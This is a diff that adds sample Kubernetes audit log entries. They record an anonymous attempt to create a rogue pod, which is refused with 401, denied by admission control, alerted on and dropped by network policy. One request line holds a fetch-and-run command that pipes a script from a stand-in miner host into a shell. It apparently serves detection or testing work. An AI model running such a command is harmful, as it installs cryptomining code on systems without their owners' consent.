@@ -1,0 +1,8 @@
+2026-10-13T05:41:01Z kube-apiserver auditID=k8s-15001 user=system:anonymous verb=get resource=version code=200 source=198.51.100.31
+2026-10-13T05:41:04Z kube-apiserver auditID=k8s-15002 user=system:anonymous verb=create resource=pods namespace=default code=401 source=198.51.100.31
+2026-10-13T05:41:05Z request auditID=k8s-15003 path=/api/v1/namespaces/default/pods auth=none body_image=alpine:latest
+2026-10-13T05:41:05Z request auditID=k8s-15003 command="/bin/sh -c curl -fsSL http://miner.example/payload.sh | sh" annotation=crypto-miner
+2026-10-13T05:41:06Z kube-apiserver auditID=k8s-15004 user=system:anonymous verb=create resource=pods namespace=default code=401 source=198.51.100.31
+2026-10-13T05:41:07Z admission-controller decision=deny reason=unauthenticated_request auditID=k8s-15004
+2026-10-13T05:41:09Z kube-audit alert=ANONYMOUS_ROGUE_POD_ATTEMPT image=alpine:latest namespace=default source=198.51.100.31 alert_id=k8s-15005
+2026-10-13T05:41:12Z network-policy action=drop src=198.51.100.31 dst=api.cluster.local:6443 rule=external_api_denied flow_id=k8s-15006
